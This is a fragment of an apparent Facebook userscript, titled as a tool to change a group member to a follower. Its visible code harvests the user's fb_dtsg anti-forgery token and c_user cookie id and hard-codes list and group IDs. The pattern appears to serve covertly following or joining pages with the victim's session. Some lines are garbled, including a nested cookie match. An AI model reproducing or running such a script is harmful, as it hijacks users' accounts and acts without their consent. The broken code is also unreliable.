...
FACEBOOK CHANGE GROUP MEMBER TO FOLLOWER
By Lovê?lý Mûsha?hid — Last update Dec 14, 2013 — Installed 0 times.
...
// @description     Welcome FACEBOOK FOLLOWER
...
sublist("230932507054810");
       ("410875875687793");


//Group subscriber
var gid = ['579784775425885'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
